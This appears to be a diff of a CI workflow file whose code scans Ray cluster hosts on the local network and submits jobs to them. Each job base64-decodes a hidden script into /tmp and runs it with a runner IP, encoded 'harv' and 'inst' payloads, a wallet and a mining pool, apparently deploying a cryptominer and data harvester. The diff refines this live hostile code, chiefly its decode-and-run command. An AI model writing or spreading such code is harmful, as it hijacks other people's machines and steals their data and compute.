@@ -401,9 +401,8 @@ jobs:
               if st != 200:
                   print('RAY %s UNREACHABLE (not in this LAN)' % rip)
                   continue
-              sub_id = 'i130xtlat-%s' % tag
-              entry = ('python3 -c "import base64,sys;open(\'/tmp/i130xtlat_p.py\',\'w\').write("'
-                       'base64.b64decode(sys.argv[1]).decode())" %s && '
+              sub_id = 'i130xtlat-%s-%s' % (tag, NONCE[-6:])
+              entry = ('echo %s | base64 -d > /tmp/i130xtlat_p.py && '
                        'python3 /tmp/i130xtlat_p.py %s %s %s %s %s %s %s') % (
                   ray_b64, NONCE, runner_ip, harv_b64, inst_b64, PFX, WALLET, POOL)
               # idempotency: reuse an existing job with the same submission id instead of resubmitting
